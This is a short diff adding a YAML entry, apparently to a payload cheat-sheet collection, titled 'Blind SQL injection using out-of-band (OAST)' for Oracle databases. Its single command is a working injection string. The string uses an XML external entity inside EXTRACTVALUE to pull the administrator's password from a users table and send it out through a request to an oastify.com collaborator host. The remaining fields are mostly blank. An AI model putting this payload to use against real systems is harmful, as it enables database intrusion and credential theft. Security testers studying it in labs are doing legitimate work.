@@ -1,0 +1,15 @@
+name: Blind SQL injection using out-of-band (OAST)
+description: Oracle DB
+commands:
+  - command: |
+      '||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.esaqgemoq3g95cibz02ta3ryopugi86x.oastify.com/"> %remote;]>'),'/l') FROM dual)||'
+    description:
+tags:
+  - sqli
+  - oast
+  - xxe
+show:
+links:
+  -
+references:
+  -
